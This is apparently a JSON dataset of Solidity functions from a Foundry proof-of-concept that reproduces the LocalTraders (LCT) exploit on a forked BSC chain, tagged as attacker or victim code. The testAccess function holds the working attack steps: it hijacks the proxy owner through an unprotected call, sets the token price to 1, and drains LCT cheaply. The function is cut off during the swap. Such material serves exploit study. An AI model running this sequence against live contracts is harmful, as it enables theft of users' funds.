[
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28_460_897);\n        cheats.label(address(LCTExchange), \"LCTExchange\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(LCT), \"LCT\");\n        cheats.label(address(WBNB), \"WBNB\");\n        cheats.label(upgradeableProxy, \"Proxy\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "testAccess",
    "original_code": "    function testAccess() public {\n        // 1.Changing owner address in vulnerable contract\n\n        emit log_named_decimal_uint(\n            \"[1] Attacker amount of WBNB before attack\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n        address addrInSlot0Before = getValFromSlot0();\n        emit log_named_address(\"[1] Address value in slot 0 before first call\", addrInSlot0Before);\n\n        // Changing address value in slot 0 (changing owner)\n        address paramForCall1 = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;\n        upgradeableProxy.call(abi.encodeWithSelector(0xb5863c10, paramForCall1));\n\n        address addrInSlot0After = getValFromSlot0();\n        // Confirm address change in slot 0\n        assertEq(addrInSlot0After, paramForCall1);\n        emit log_named_address(\"[1] Address value in slot 0 after first call\", addrInSlot0After);\n\n        // 2.Changing token price in vulnerable contract\n\n        cheats.roll(28_460_898);\n        uint256 uintInSlot3Before = getValFromSlot3();\n        emit log_named_uint(\"[2] Uint value (token price) in slot 3 before second call\", uintInSlot3Before);\n\n        // Changing uint value in slot 3 (token price)\n        uint256 paramForCall2 = 1;\n        upgradeableProxy.call(abi.encodeWithSelector(0x925d400c, paramForCall2));\n\n        uint256 uintInSlot3After = getValFromSlot3();\n        // Confirm price change in slot 3\n        assertEq(uintInSlot3After, paramForCall2);\n        emit log_named_uint(\"[2] Uint value (token price) in slot 3 after second call\", uintInSlot3After);\n\n        // 3.Buying LCT\n\n        cheats.roll(28_460_899);\n        uint256 payableAmount = (LCT.balanceOf(address(LCTExchange)) / 1 ether) - 1;\n\n        LCTExchange.buyTokens{value: payableAmount}();\n\n        emit log_named_decimal_uint(\"[3] Bought LCT tokens\", LCT.balanceOf(address(this)), LCT.decimals());\n\n        // 4.Swap to WBNB\n\n        cheats.roll(28_461_207);\n        LCT.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(LCT);\n        path[1] = address(WBNB);\n",
    "description": ""
  },
  {
    "contract/interface": "LocalTraders",
    "source_type": "attacker_contract",
    "function_name": "upgradeableProxy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILCTExchange",
    "source_type": "victim_contract",
    "function_name": "buyTokens",
    "original_code": "    function buyTokens() public payable returns (uint, uint) {\n        require(msg.value > 0, \"Send ETH to buy some tokens\");\n\n        // uint256 tokenAmount = msg.value / livePriceRate; // 1 / 0.00004628 = 21607.605877269\n        uint256 tokenAmount2 = msg.value / getLivePriceFromInheritance();\n        uint256 tokenAmount = tokenAmount2 * 1000000000000000000;\n\n        require(\n            token.balanceOf(address(this)) >= tokenAmount,\n            \"Vendor contract has not enough tokens in its balance\"\n        );\n\n        // Transfer token to the msg.sender\n        bool sent = token.transfer(msg.sender, tokenAmount);\n        require(sent, \"Failed to transfer token to user\");\n\n        emit TokensPurchased(\n            msg.sender,\n            address(token),\n            tokenAmount,\n            getLivePriceFromInheritance()\n        );\n\n        return (getLivePriceFromInheritance(), msg.value);\n    }\n\n",
    "description": ""
  }
]